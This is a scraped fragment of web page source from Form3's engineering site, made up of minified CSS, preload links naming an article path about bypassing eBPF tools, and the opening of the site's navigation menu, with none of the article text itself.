transparent;outline-offset:2px}.blur{--tw-blur:blur(8px);filter:var(--tw-filter)}.filter{filter:var(--tw-filter)}.transition-all{transition-property:all;transition-timing-function:cubic-bezier(.4,0,.2,1);transition-duration:150ms}.transition-opacity{transition-property:opacity;transition-timing-function:cubic-bezier(.4,0,.2,1);transition-duration:150ms}.transition{transition-property:background-color,border-color,color,fill,stroke,opacity,box-shadow,transform,filter,-webkit-backdrop-filter;transition-property:background-color,border-color,color,fill,stroke,opacity,box-shadow,transform,filter,backdrop-filter;transition-property:background-color,border-color,color,fill,stroke,opacity,box-shadow,transform,filter,backdrop-filter,-webkit-backdrop-filter;transition-timing-function:cubic-bezier(.4,0,.2,1);transition-duration:150ms}.transition-transform{transition-property:transform;transition-timing-function:cubic-bezier(.4,0,.2,1);transition-duration:150ms}.transition-colors{transition-property:background-color,border-color,color,fill,stroke;transition-timing-function:cubic-bezier(.4,0,.2,1);transition-duration:150ms}.duration-300{transition-duration:.3s}.duration-\[\$\{animationSpeed\}\]{transition-duration:{};}.duration-500{transition-duration:.5s}.duration-\[250ms\]{transition-duration:250ms}.duration-200{transition-duration:.2s}.ease-in-out{transition-timing-function:cubic-bezier(.4,0,.2,1)}.ease-out{transition-timing-function:cubic-bezier(0,0,.2,1)}.grid-ltr{direction:ltr}.before\:absolute::before{content:"";position:absolute}.before\:left-0::before{content:"";left:0}.before\:top-\[-2px\]::before{content:"";top:-2px}.before\:top-1\/2::before{content:"";top:50%}.before\:h-\[2px\]::before{content:"";height:2px}.before\:h-2::before{content:"";height:.5rem}.before\:w-10\/12::before{content:"";width:83.333333%}.before\:w-0::before{content:"";width:0}.before\:w-2::before{content:"";width:.5rem}.before\:-translate-y-1\/2::before{content:"";--tw-translate-y:-50%;transform:var(--tw-transform)}.before\:rounded-full::before{content:"";border-radius:9999px}.before\:bg-dark-navy::before{content:"";--tw-bg-opacity:1;background-color:rgba(22,36,64,var(--tw-bg-opacity))}.before\:bg-ocean-blue::before{content:"";--tw-bg-opacity:1;background-color:rgba(38,55,94,var(--tw-bg-opacity))}.before\:bg-sky-blue::before{content:"";--tw-bg-opacity:1;background-color:rgba(227,235,243,var(--tw-bg-opacity))}.before\:bg-soft-white::before{content:"";--tw-bg-opacity:1;background-color:rgba(249,249,249,var(--tw-bg-opacity))}.before\:bg-teal::before{content:"";--tw-bg-opacity:1;background-color:rgba(0,205,205,var(--tw-bg-opacity))}.before\:bg-azure::before{content:"";--tw-bg-opacity:1;background-color:rgba(90,189,255,var(--tw-bg-opacity))}.before\:bg-coral::before{content:"";--tw-bg-opacity:1;background-color:rgba(255,99,99,var(--tw-bg-opacity))}.before\:bg-gray::before{content:"";--tw-bg-opacity:1;background-color:rgba(229,229,229,var(--tw-bg-opacity))}.before\:bg-link-blue::before{content:"";--tw-bg-opacity:1;background-color:rgba(32,156,238,var(--tw-bg-opacity))}.before\:transition-all::before{content:"";transition-property:all;transition-timing-function:cubic-bezier(.4,0,.2,1);transition-duration:150ms}.after\:mt-2::after{content:"";margin-top:.5rem}.after\:block::after{content:"";display:block}.after\:origin-left::after{content:"";transform-origin:left}.after\:scale-x-0::after{content:"";--tw-scale-x:0;transform:var(--tw-transform)}.after\:scale-x-100::after{content:"";--tw-scale-x:1;transform:var(--tw-transform)}.after\:border-b::after{content:"";border-bottom-width:1px}.after\:border-dark-navy::after{content:"";--tw-border-opacity:1;border-color:rgba(22,36,64,var(--tw-border-opacity))}.after\:bg-dark-navy::after{content:"";--tw-bg-opacity:1;background-color:rgba(22,36,64,var(--tw-bg-opacity))}.after\:bg-ocean-blue::after{content:"";--tw-bg-opacity:1;background-color:rgba(38,55,94,var(--tw-bg-opacity))}.after\:bg-sky-blue::after{content:"";--tw-bg-opacity:1;background-color:rgba(227,235,243,var(--tw-bg-opacity))}.after\:bg-soft-white::after{content:"";--tw-bg-opacity:1;background-color:rgba(249,249,249,var(--tw-bg-opacity))}.after\:bg-teal::after{content:"";--tw-bg-opacity:1;background-color:rgba(0,205,205,var(--tw-bg-opacity))}.after\:bg-azure::after{content:"";--tw-bg-opacity:1;background-color:rgba(90,189,255,var(--tw-bg-opacity))}.after\:bg-coral::after{content:"";--tw-bg-opacity:1;background-color:rgba(255,99,99,var(--tw-bg-opacity))}.after\:bg-gray::after{content:"";--tw-bg-opacity:1;background-color:rgba(229,229,229,var(--tw-bg-opacity))}.after\:bg-link-blue::after{content:"";--tw-bg-opacity:1;background-color:rgba(32,156,238,var(--tw-bg-opacity))}.after\:transition-transform::after{content:"";transition-property:transform;transition-timing-function:cubic-bezier(.4,0,.2,1);transition-duration:150ms}.after\:duration-300::after{content:"";transition-duration:.3s}.first\:pt-0:first-child{padding-top:0}.first\:pl-0:first-child{padding-left:0}.last\:mb-0:last-child{margin-bottom:0}.last\:mr-0:last-child{margin-right:0}.last\:\!mb-0:last-child{margin-bottom:0!important}.last\:border-0:last-child{border-width:0}.last\:pr-0:last-child{padding-right:0}.placeholder-shown\:opacity-60:-moz-placeholder-shown{opacity:.6}.placeholder-shown\:opacity-60:-ms-input-placeholder{opacity:.6}.placeholder-shown\:opacity-60:placeholder-shown{opacity:.6}.hover\:bg-dark-navy:hover{--tw-bg-opacity:1;background-color:rgba(22,36,64,var(--tw-bg-opacity))}.hover\:bg-ocean-blue:hover{--tw-bg-opacity:1;background-color:rgba(38,55,94,var(--tw-bg-opacity))}.hover\:bg-sky-blue:hover{--tw-bg-opacity:1;background-color:rgba(227,235,243,var(--tw-bg-opacity))}.hover\:bg-soft-white:hover{--tw-bg-opacity:1;background-color:rgba(249,249,249,var(--tw-bg-opacity))}.hover\:bg-teal:hover{--tw-bg-opacity:1;background-color:rgba(0,205,205,var(--tw-bg-opacity))}.hover\:bg-azure:hover{--tw-bg-opacity:1;background-color:rgba(90,189,255,var(--tw-bg-opacity))}.hover\:bg-coral:hover{--tw-bg-opacity:1;background-color:rgba(255,99,99,var(--tw-bg-opacity))}.hover\:bg-gray:hover{--tw-bg-opacity:1;background-color:rgba(229,229,229,var(--tw-bg-opacity))}.hover\:bg-link-blue:hover{--tw-bg-opacity:1;background-color:rgba(32,156,238,var(--tw-bg-opacity))}.hover\:bg-opacity-60:hover{--tw-bg-opacity:0.6}.hover\:underline:hover{text-decoration:underline}.hover\:opacity-100:hover{opacity:1}.hover\:shadow-innerLarge:hover{--tw-shadow:inset 0px 0px 0px 100rem rgba(0, 0, 0, 0.2);box-shadow:var(--tw-ring-offset-shadow,0 0 #0000),var(--tw-ring-shadow,0 0 #0000),var(--tw-shadow)}.hover\:before\:w-full:hover::before{content:"";width:100%}.focus\:opacity-100:focus{opacity:1}.active\:bg-soft-white:active{--tw-bg-opacity:1;background-color:rgba(249,249,249,var(--tw-bg-opacity))}.active\:bg-ocean-blue:active{--tw-bg-opacity:1;background-color:rgba(38,55,94,var(--tw-bg-opacity))}.active\:bg-opacity-60:active{--tw-bg-opacity:0.6}.active\:opacity-80:active{opacity:.8}.disabled\:opacity-30:disabled{opacity:.3}.group:hover .group-hover\:pointer-events-auto{pointer-events:auto}.group:hover .group-hover\:ml-2\.5{margin-left:.625rem}.group:hover .group-hover\:ml-2{margin-left:.5rem}.group:hover .group-hover\:block{display:block}.group:hover .group-hover\:w-auto{width:auto}.group:hover .group-hover\:translate-y-0{--tw-translate-y:0px;transform:var(--tw-transform)}.group:hover .group-hover\:-rotate-180{--tw-rotate:-180deg;transform:var(--tw-transform)}.group:hover .group-hover\:bg-opacity-10{--tw-bg-opacity:0.1}.group:hover .group-hover\:opacity-100{opacity:1}.group:active .group-active\:bg-opacity-40{--tw-bg-opacity:0.4}.peer:-moz-placeholder-shown~.peer-placeholder-shown\:bottom-1\.5{bottom:.375rem}.peer:-ms-input-placeholder~.peer-placeholder-shown\:bottom-1\.5{bottom:.375rem}.peer:placeholder-shown~.peer-placeholder-shown\:bottom-1\.5{bottom:.375rem}.peer:-moz-placeholder-shown~.peer-placeholder-shown\:bottom-1{bottom:.25rem}.peer:-ms-input-placeholder~.peer-placeholder-shown\:bottom-1{bottom:.25rem}.peer:placeholder-shown~.peer-placeholder-shown\:bottom-1{bottom:.25rem}.peer:-moz-placeholder-shown~.peer-placeholder-shown\:top-\[-1px\]{top:-1px}.peer:-ms-input-placeholder~.peer-placeholder-shown\:top-\[-1px\]{top:-1px}.peer:placeholder-shown~.peer-placeholder-shown\:top-\[-1px\]{top:-1px}.peer:-moz-placeholder-shown~.peer-placeholder-shown\:text-size-p-mobile{font-size:1rem;line-height:1.375rem}.peer:-ms-input-placeholder~.peer-placeholder-shown\:text-size-p-mobile{font-size:1rem;line-height:1.375rem}.peer:placeholder-shown~.peer-placeholder-shown\:text-size-p-mobile{font-size:1rem;line-height:1.375rem}.peer:-moz-placeholder-shown~.peer-placeholder-shown\:font-normal{font-weight:400}.peer:-ms-input-placeholder~.peer-placeholder-shown\:font-normal{font-weight:400}.peer:placeholder-shown~.peer-placeholder-shown\:font-normal{font-weight:400}.peer:hover:-moz-placeholder-shown~.peer-hover\:peer-placeholder-shown\:font-normal{font-weight:400}.peer:hover:-ms-input-placeholder~.peer-hover\:peer-placeholder-shown\:font-normal{font-weight:400}.peer:hover:placeholder-shown~.peer-hover\:peer-placeholder-shown\:font-normal{font-weight:400}.peer:hover:-moz-placeholder-shown~.peer-hover\:peer-placeholder-shown\:opacity-100{opacity:1}.peer:hover:-ms-input-placeholder~.peer-hover\:peer-placeholder-shown\:opacity-100{opacity:1}.peer:hover:placeholder-shown~.peer-hover\:peer-placeholder-shown\:opacity-100{opacity:1}.peer:focus~.peer-focus\:bottom-9{bottom:2.25rem}.peer:focus~.peer-focus\:top-\[-26px\]{top:-26px}.peer:focus~.peer-focus\:text-size-label-desktop{font-size:.875rem;line-height:1rem}.peer:focus~.peer-focus\:font-medium{font-weight:500}.peer:focus:hover~.peer-focus\:peer-hover\:opacity-60{opacity:.6}.peer:disabled~.peer-disabled\:opacity-30{opacity:.3}.group-secondary:hover .group-secondary-hover\:translate-x-2,.translate-x-2{--tw-translate-x:0.5rem;transform:var(--tw-transform)}@media (min-width:640px){.sm\:row-start-1{grid-row-start:1}.sm\:row-start-2{grid-row-start:2}.sm\:row-end-1{grid-row-end:1}.sm\:row-end-2{grid-row-end:2}.sm\:mb-8{margin-bottom:2rem}.sm\:block{display:block}.sm\:min-h-\[327px\]{min-height:327px}.sm\:grid-cols-2{grid-template-columns:repeat(2,minmax(0,1fr))}.sm\:flex-row{flex-direction:row}.sm\:pr-8{padding-right:2rem}}@media (min-width:768px){.md\:visible{visibility:visible}.md\:absolute{position:absolute}.md\:left-\[-14px\]{left:-14px}.md\:bottom-\[30px\]{bottom:30px}.md\:bottom-0{bottom:0}.md\:bottom-auto{bottom:auto}.md\:top-1{top:.25rem}.md\:order-none{order:0}.md\:col-span-full{grid-column:1/-1}.md\:col-span-8{grid-column:span 8/span 8}.md\:col-span-3{grid-column:span 3/span 3}.md\:col-span-6{grid-column:span 6/span 6}.md\:col-span-4{grid-column:span 4/span 4}.md\:col-span-5{grid-column:span 5/span 5}.md\:col-span-9{grid-column:span 9/span 9}.md\:col-start-5{grid-column-start:5}.md\:col-start-2{grid-column-start:2}.md\:col-start-9{grid-column-start:9}.md\:col-start-7{grid-column-start:7}.md\:col-start-8{grid-column-start:8}.md\:col-start-1{grid-column-start:1}.md\:col-start-6{grid-column-start:6}.md\:col-end-6{grid-column-end:6}.md\:col-end-13{grid-column-end:13}.md\:row-start-1{grid-row-start:1}.md\:row-end-1{grid-row-end:1}.md\:my-6{margin-top:1.5rem;margin-bottom:1.5rem}.md\:mr-16{margin-right:4rem}.md\:mb-0{margin-bottom:0}.md\:mb-10{margin-bottom:2.5rem}.md\:mt-0{margin-top:0}.md\:mt-\[-130px\]{margin-top:-130px}.md\:ml-5{margin-left:1.25rem}.md\:ml-\[20\%\]{margin-left:20%}.md\:block{display:block}.md\:inline-block{display:inline-block}.md\:inline{display:inline}.md\:flex{display:flex}.md\:table{display:table}.md\:grid{display:grid}.md\:hidden{display:none}.md\:h-12{height:3rem}.md\:h-\[300px\]{height:300px}.md\:max-h-\[159px\]{max-height:159px}.md\:max-h-\[600px\]{max-height:600px}.md\:max-h-full{max-height:100%}.md\:min-h-\[428px\]{min-height:428px}.md\:w-3\/4{width:75%}.md\:w-12{width:3rem}.md\:w-\[300px\]{width:300px}.md\:w-1\/2{width:50%}.md\:max-w-18{max-width:18rem}.md\:max-w-\[159px\]{max-width:159px}.md\:translate-x-0{--tw-translate-x:0px;transform:var(--tw-transform)}.md\:auto-cols-max{grid-auto-columns:-webkit-max-content;grid-auto-columns:max-content}.md\:grid-flow-col{grid-auto-flow:column}.md\:grid-cols-12{grid-template-columns:repeat(12,minmax(0,1fr))}.md\:grid-cols-2{grid-template-columns:repeat(2,minmax(0,1fr))}.md\:grid-cols-3{grid-template-columns:repeat(3,minmax(0,1fr))}.md\:grid-rows-none{grid-template-rows:none}.md\:grid-rows-1{grid-template-rows:repeat(1,minmax(0,1fr))}.md\:flex-row{flex-direction:row}.md\:flex-row-reverse{flex-direction:row-reverse}.md\:items-start{align-items:flex-start}.md\:items-end{align-items:flex-end}.md\:items-center{align-items:center}.md\:justify-end{justify-content:flex-end}.md\:gap-4{gap:1rem}.md\:gap-6{gap:1.5rem}.md\:gap-y-10{row-gap:2.5rem}.md\:p-8{padding:2rem}.md\:py-10{padding-top:2.5rem;padding-bottom:2.5rem}.md\:py-14{padding-top:3.5rem;padding-bottom:3.5rem}.md\:px-0{padding-left:0;padding-right:0}.md\:pb-3{padding-bottom:.75rem}.md\:pl-4{padding-left:1rem}.md\:pr-0{padding-right:0}.md\:pl-\[294px\]{padding-left:294px}.md\:pl-5{padding-left:1.25rem}.md\:pt-0{padding-top:0}.md\:pr-6{padding-right:1.5rem}.md\:pt-20{padding-top:5rem}.md\:pt-40{padding-top:10rem}.md\:text-size-h2-tablet{font-size:2.5rem;line-height:2.75rem}.md\:text-size-h1-tablet{font-size:4.5rem;line-height:4.75rem}.md\:text-size-h5-tablet{font-size:1.5rem;line-height:1.75rem}.md\:text-size-h3-tablet{font-size:1.75rem;line-height:2rem}.md\:text-size-h4-tablet{font-size:1.5rem;line-height:1.75rem}.md\:grid-rtl{direction:rtl}.md\:before\:content-\[attr\(data-separator\)\]::before{content:attr(data-separator)}}@media (min-width:1024px){.lg\:top-\[52px\]{top:52px}.lg\:order-2{order:2}.lg\:col-span-4{grid-column:span 4/span 4}.lg\:col-span-8{grid-column:span 8/span 8}.lg\:col-span-3{grid-column:span 3/span 3}.lg\:col-span-5{grid-column:span 5/span 5}.lg\:col-span-6{grid-column:span 6/span 6}.lg\:col-start-5{grid-column-start:5}.lg\:col-start-10{grid-column-start:10}.lg\:col-start-7{grid-column-start:7}.lg\:col-start-9{grid-column-start:9}.lg\:mt-\[80px\]{margin-top:80px}.lg\:mt-14{margin-top:3.5rem}.lg\:mb-24{margin-bottom:6rem}.lg\:mb-20{margin-bottom:5rem}.lg\:block{display:block}.lg\:inline-block{display:inline-block}.lg\:flex{display:flex}.lg\:grid{display:grid}.lg\:hidden{display:none}.lg\:h-auto{height:auto}.lg\:max-h-\[calc\(100vh-7rem\)\]{max-height:calc(100vh - 7rem)}.lg\:w-full{width:100%}.lg\:w-9\/12{width:75%}.lg\:w-8\/12{width:66.666667%}.lg\:w-\[768px\]{width:768px}.lg\:w-auto{width:auto}.lg\:w-4\/12{width:33.333333%}.lg\:max-w-xl{max-width:36rem}.lg\:max-w-26{max-width:26rem}.lg\:cursor-auto{cursor:auto}.lg\:grid-flow-col{grid-auto-flow:column}.lg\:grid-cols-12{grid-template-columns:repeat(12,minmax(0,1fr))}.lg\:grid-cols-3{grid-template-columns:repeat(3,minmax(0,1fr))}.lg\:grid-rows-none{grid-template-rows:none}.lg\:flex-row{flex-direction:row}.lg\:justify-start{justify-content:flex-start}.lg\:justify-end{justify-content:flex-end}.lg\:gap-16{gap:4rem}.lg\:gap-4{gap:1rem}.lg\:gap-y-16{row-gap:4rem}.lg\:rounded-2xl{border-radius:1rem}.lg\:rounded-none{border-radius:0}.lg\:border-b-0{border-bottom-width:0}.lg\:bg-transparent{background-color:transparent}.lg\:p-8{padding:2rem}.lg\:p-0{padding:0}.lg\:px-8{padding-left:2rem;padding-right:2rem}.lg\:py-20{padding-top:5rem;padding-bottom:5rem}.lg\:py-8{padding-top:2rem;padding-bottom:2rem}.lg\:px-10{padding-left:2.5rem;padding-right:2.5rem}.lg\:py-\[80px\]{padding-top:80px;padding-bottom:80px}.lg\:pb-10{padding-bottom:2.5rem}.lg\:pb-\[80px\]{padding-bottom:80px}.lg\:pt-\[104px\]{padding-top:104px}.lg\:pb-\[56px\]{padding-bottom:56px}.lg\:pt-\[120px\]{padding-top:120px}.lg\:pb-0{padding-bottom:0}.lg\:text-size-h2-desktop{font-size:3.5rem;line-height:3.75rem}.lg\:text-size-h1-desktop{font-size:5.5rem;line-height:5.75rem}.lg\:text-size-h5-desktop{font-size:1.5rem;line-height:1.75rem}.lg\:text-size-h3-desktop{font-size:2.5rem;line-height:2.75rem}.lg\:text-size-h4-desktop{font-size:2rem;line-height:2.25rem}.lg\:leading-9{line-height:2.25rem}}@media (min-width:1280px){.xl\:grid-cols-4{grid-template-columns:repeat(4,minmax(0,1fr))}.xl\:grid-cols-3{grid-template-columns:repeat(3,minmax(0,1fr))}.xl\:px-14{padding-left:3.5rem;padding-right:3.5rem}.xl\:px-14\.5{padding-left:3.875rem;padding-right:3.875rem}.xl\:px-\[38px\]{padding-left:38px;padding-right:38px}.xl\:pl-0{padding-left:0}.xl\:pr-0{padding-right:0}}.hooper-slide{flex-shrink:0;height:100%;margin:0;padding:0;list-style:none}.hooper-progress{position:absolute;top:0;right:0;left:0;height:4px;background-color:#efefef}.hooper-progress-inner{height:100%;background-color:#4285f4;transition:.3s}.hooper-pagination{position:absolute;bottom:0;right:50%;transform:translateX(50%);display:flex;padding:5px 10px}.hooper-indicators{display:flex;list-style:none;margin:0;padding:0}.hooper-indicator.is-active,.hooper-indicator:hover{background-color:#4285f4}.hooper-indicator{margin:0 2px;width:12px;height:4px;border-radius:4px;border:none;padding:0;background-color:#fff;cursor:pointer}.hooper-pagination.is-vertical{bottom:auto;right:0;top:50%;transform:translateY(-50%)}.hooper-pagination.is-vertical .hooper-indicators{flex-direction:column}.hooper-pagination.is-vertical .hooper-indicator{width:6px}.hooper-next,.hooper-prev{background-color:transparent;border:none;padding:1em;position:absolute;top:50%;transform:translateY(-50%);cursor:pointer}.hooper-next.is-disabled,.hooper-prev.is-disabled{opacity:.3;cursor:not-allowed}.hooper-next{right:0}.hooper-prev{left:0}.hooper-navigation.is-vertical .hooper-next{top:auto;bottom:0;transform:none}.hooper-navigation.is-vertical .hooper-prev{top:0;bottom:auto;right:0;left:auto;transform:none}.hooper-navigation.is-rtl .hooper-prev{left:auto;right:0}.hooper-navigation.is-rtl .hooper-next{right:auto;left:0}.hooper{position:relative;width:100%;height:200px}.hooper,.hooper *{box-sizing:border-box}.hooper-list{overflow:hidden;width:100%;height:100%}.hooper-track{display:flex;box-sizing:border-box;width:100%;height:100%;padding:0;margin:0}.hooper.is-vertical .hooper-track{flex-direction:column;height:200px}.hooper.is-rtl{direction:rtl}.hooper-sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);border:0}.hooper,.hooper .hooper-slide{height:auto}.line-numbers-rows{overflow:hidden;height:100%}.v-select{position:relative;font-family:inherit}.v-select,.v-select *{box-sizing:border-box}@-webkit-keyframes vSelectSpinner{0%{transform:rotate(0)}to{transform:rotate(1turn)}}@keyframes vSelectSpinner{0%{transform:rotate(0)}to{transform:rotate(1turn)}}.vs__fade-enter-active,.vs__fade-leave-active{pointer-events:none;transition:opacity .15s cubic-bezier(1,.5,.8,1)}.vs__fade-enter,.vs__fade-leave-to{opacity:0}.vs--disabled .vs__clear,.vs--disabled .vs__dropdown-toggle,.vs--disabled .vs__open-indicator,.vs--disabled .vs__search,.vs--disabled .vs__selected{cursor:not-allowed;background-color:#f8f8f8}.v-select[dir=rtl] .vs__actions{padding:0 3px 0 6px}.v-select[dir=rtl] .vs__clear{margin-left:6px;margin-right:0}.v-select[dir=rtl] .vs__deselect{margin-left:0;margin-right:2px}.v-select[dir=rtl] .vs__dropdown-menu{text-align:right}.vs__dropdown-toggle{-webkit-appearance:none;-moz-appearance:none;appearance:none;display:flex;padding:0 0 4px;background:0 0;border:1px solid rgba(60,60,60,.26);border-radius:4px;white-space:normal}.vs__selected-options{display:flex;flex-basis:100%;flex-grow:1;flex-wrap:wrap;padding:0 2px;position:relative}.vs__actions{display:flex;align-items:center;padding:4px 6px 0 3px}.vs--searchable .vs__dropdown-toggle{cursor:text}.vs--unsearchable .vs__dropdown-toggle{cursor:pointer}.vs--open .vs__dropdown-toggle{border-bottom-color:transparent;border-bottom-left-radius:0;border-bottom-right-radius:0}.vs__open-indicator{fill:rgba(60,60,60,.5);transform:scale(1);transition:transform .15s cubic-bezier(1,-.115,.975,.855);transition-timing-function:cubic-bezier(1,-.115,.975,.855)}.vs--open .vs__open-indicator{transform:rotate(180deg) scale(1)}.vs--loading .vs__open-indicator{opacity:0}.vs__clear{fill:rgba(60,60,60,.5);padding:0;border:0;background-color:transparent;cursor:pointer;margin-right:8px}.vs__dropdown-menu{display:block;box-sizing:border-box;position:absolute;top:calc(100% - 1px);left:0;z-index:1000;padding:5px 0;margin:0;width:100%;max-height:350px;min-width:160px;overflow-y:auto;box-shadow:0 3px 6px 0 rgba(0,0,0,.15);border:1px solid rgba(60,60,60,.26);border-top-style:none;border-radius:0 0 4px 4px;text-align:left;list-style:none;background:#fff}.vs__no-options{text-align:center}.vs__dropdown-option{line-height:1.42857143;display:block;padding:3px 20px;clear:both;color:#333;white-space:nowrap;cursor:pointer}.vs__dropdown-option--highlight{background:#5897fb;color:#fff}.vs__dropdown-option--deselect{background:#fb5858;color:#fff}.vs__dropdown-option--disabled{background:inherit;color:rgba(60,60,60,.5);cursor:inherit}.vs__selected{display:flex;align-items:center;background-color:#f0f0f0;border:1px solid rgba(60,60,60,.26);border-radius:4px;color:#333;line-height:1.4;margin:4px 2px 0;padding:0 .25em;z-index:0}.vs__deselect{display:inline-flex;-webkit-appearance:none;-moz-appearance:none;appearance:none;margin-left:4px;padding:0;border:0;cursor:pointer;background:0 0;fill:rgba(60,60,60,.5);text-shadow:0 1px 0 #fff}.vs--single .vs__selected{background-color:transparent;border-color:transparent}.vs--single.vs--loading .vs__selected,.vs--single.vs--open .vs__selected{position:absolute;opacity:.4}.vs--single.vs--searching .vs__selected{display:none}.vs__search::-webkit-search-cancel-button{display:none}.vs__search::-ms-clear,.vs__search::-webkit-search-decoration,.vs__search::-webkit-search-results-button,.vs__search::-webkit-search-results-decoration{display:none}.vs__search,.vs__search:focus{-webkit-appearance:none;-moz-appearance:none;appearance:none;line-height:1.4;font-size:1em;border:1px solid transparent;border-left:none;outline:0;margin:4px 0 0;padding:0 7px;background:0 0;box-shadow:none;width:0;max-width:100%;flex-grow:1;z-index:1}.vs__search::-moz-placeholder{color:inherit}.vs__search:-ms-input-placeholder{color:inherit}.vs__search::placeholder{color:inherit}.vs--unsearchable .vs__search{opacity:1}.vs--unsearchable:not(.vs--disabled) .vs__search{cursor:pointer}.vs--single.vs--searching:not(.vs--open):not(.vs--loading) .vs__search{opacity:.2}.vs__spinner{align-self:center;opacity:0;font-size:5px;text-indent:-9999em;overflow:hidden;border:.9em solid hsla(0,0%,39.2%,.1);border-left-color:rgba(60,60,60,.45);transform:translateZ(0);-webkit-animation:vSelectSpinner 1.1s linear infinite;animation:vSelectSpinner 1.1s linear infinite;transition:opacity .1s}.vs__spinner,.vs__spinner:after{border-radius:50%;width:5em;height:5em}.vs--loading .vs__spinner{opacity:1}.nuxt-progress{position:fixed;top:0;left:0;right:0;height:2px;width:0;opacity:1;transition:width .1s,opacity .4s;background-color:#000;z-index:999999}.nuxt-progress.nuxt-progress-notransition{transition:none}.nuxt-progress-failed{background-color:red}.text-with-border[data-v-3a38c3a0]:after{content:"";pointer-events:none;position:absolute;left:0;bottom:-1px;height:1px;width:100%;transform:var(--tw-transform);opacity:0;transition-property:all;transition-timing-function:cubic-bezier(.4,0,.2,1);transition-duration:150ms;background:linear-gradient(90deg,rgba(249,250,252,0),currentColor)}.text-with-border.nuxt-link-active[data-v-3a38c3a0]:after,.text-with-border[data-v-3a38c3a0]:hover:after{--tw-translate-x:1.75rem;transform:var(--tw-transform);opacity:1}button[data-v-7666961d]{position:relative;z-index:10;height:3rem;width:3rem;--tw-rotate:0deg;transform:var(--tw-transform);transform:var(--tw-transform);cursor:pointer;border-radius:9999px;--tw-bg-opacity:1;background-color:rgba(255,255,255,var(--tw-bg-opacity));--tw-text-opacity:1;color:rgba(22,36,64,var(--tw-text-opacity));--tw-text-opacity:0.2;--tw-shadow:0 0 0 1px currentColor;box-shadow:var(--tw-ring-offset-shadow,0 0 #0000),var(--tw-ring-shadow,0 0 #0000),var(--tw-shadow);transition-property:all;transition-timing-function:cubic-bezier(.4,0,.2,1);transition-duration:150ms;transition-duration:.5s;transition-timing-function:cubic-bezier(.4,0,.2,1)}button span[data-v-7666961d]{position:absolute;left:1rem;display:block;height:2px;width:1rem;--tw-rotate:0deg;transform:var(--tw-transform);transform:var(--tw-transform);border-radius:.5rem;--tw-bg-opacity:1;background-color:rgba(22,36,64,var(--tw-bg-opacity));opacity:1;transition-property:all;transition-timing-function:cubic-bezier(.4,0,.2,1);transition-duration:150ms;transition-duration:250ms;transition-timing-function:cubic-bezier(.4,0,.2,1)}button span[data-v-7666961d]:first-child{top:18px}button span[data-v-7666961d]:nth-child(2),button span[data-v-7666961d]:nth-child(3){top:1.5rem}button span[data-v-7666961d]:nth-child(4){top:30px}button.open span[data-v-7666961d]{height:3px}button.open span[data-v-7666961d]:first-child{top:1.5rem;left:50%;width:0}button.open span[data-v-7666961d]:nth-child(2){--tw-rotate:45deg;transform:var(--tw-transform)}button.open span[data-v-7666961d]:nth-child(3){--tw-rotate:-45deg;transform:var(--tw-transform)}button.open span[data-v-7666961d]:nth-child(4){top:1.5rem;left:50%;width:0}</style><link rel="preload" href="/_nuxt/static/1668689593/engineering/content/bypassing-ebpf-tools/state.js" as="script"><link rel="preload" href="/_nuxt/static/1668689593/engineering/content/bypassing-ebpf-tools/payload.js" as="script"><link rel="preload" href="/_nuxt/static/1668689593/manifest.js" as="script">
  </head>
  <body>
    <div data-server-rendered="true" id="__nuxt"><!----><div id="__layout"><div class="flex flex-col min-h-screen antialiased"><header class="font-mulish font-bold text-size-1 bg-soft-white text-dark-navy"><!----> <div class="hidden lg:block border-b border-dark-navy border-opacity-20 relative"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5 flex items-center justify-between"><a href="/" data-e2e-logo="" class="nuxt-link-active"><img src="/_nuxt/img/logo-dark.339ede7.svg" alt="logo-dark"></a> <ul class="flex items-center justify-between"><li class="group pr-5" data-v-3a38c3a0><div class="flex items-center relative z-10 cursor-pointer gap-2" data-v-3a38c3a0><a href="/why-form3" class="pl-5 py-7 text-with-border relative whitespace-nowrap" data-v-3a38c3a0>
      Why Form3
    </a> <div class="cursor-pointer flex-grow flex-shrink-0 basis-5" data-v-3a38c3a0><img src="/_nuxt/img/chevron-down-20px-dark.2c1d915.svg" alt="chevron-down-20px-dark" class="transition-all ease-out" data-v-3a38c3a0></div></div> <div class="absolute left-0 z-40 w-full transition-all hidden border-t border-opacity-20 border-dark-navy" data-v-3a38c3a0><div class="bg-soft-white bg-opacity-70 text-dark-navy w-full h-full" data-v-3a38c3a0><div class="bg-soft-white border-b border-dark-navy border-opacity-20 pt-8 pb-8" data-v-3a38c3a0><div data-v-3a38c3a0><div class="container mx-auto max-w-screen-8xl xl:px-[38px] animate-slide-in-opacity-0-to-100" data-v-3a38c3a0><div><!----> <div class="grid grid-cols-4"><div class="font-normal h-full flex flex-col justify-start col-span-1 pr-8"><a href="/why-form3" tabindex="0" class="p-6 rounded-lg transition-colors hover:bg-sky-blue"><div class="pb-4"><h4>
        Why Form3
      </h4></div> <div class="text-base">
      Payment technology reimagined
    </div></a> <!----></div><div class="font-normal h-full flex flex-col justify-start col-span-1 pr-8"><a href="/why-form3/approach" tabindex="0" class="p-6 rounded-lg transition-colors hover:bg-sky-blue"><div class="pb-4"><h4>
        Our approach
      </h4></div> <div class="text-base">
      How we power the future of payments
    </div></a> <!----></div><div class="font-normal h-full flex flex-col justify-start col-span-1 pr-8"><a href="/why-form3/about-us" tabindex="0" class="p-6 rounded-lg transition-colors hover:bg-sky-blue"><div class="pb-4"><h4>
        About us
      </h4></div> <div class="text-base">
      Learn about our story
    </div></a> <div class="flex flex-col"><a href="/why-form3/about-us/team" tabindex="0" class="rounded-lg transition-colors px-6 py-3 hover:bg-sky-blue"><div class="flex content-start"><span class="group-secondary inline-flex content-center font-mulish font-bold cursor-pointer whitespace-nowrap">
        The team
       <img src="/_nuxt/img/arrow-right-dark.dba56c9.svg" alt="arrow-right-dark" class="transition-transform group-secondary-hover:translate-x-2 inline-block ml-2"></span></div></a></div></div></div></div><div><div class="divider my-16 mx-6 w-full"><img src="/_nuxt/img/menu-divider-dark.b09f30d.svg" alt="menu-divider-dark" class="inline-block"></div> <div class="grid grid-cols-3 xl:grid-cols-4"><div newline="true" class="font-normal h-full flex flex-col justify-start col-span-1 pr-8"><a href="/why-form3/press" tabindex="0" class="p-6 rounded-lg transition-colors hover:bg-sky-blue"><div class="pb-4"><h4>
        Press
      </h4></div> <div class="text-base">
      Form3 in the spotlight
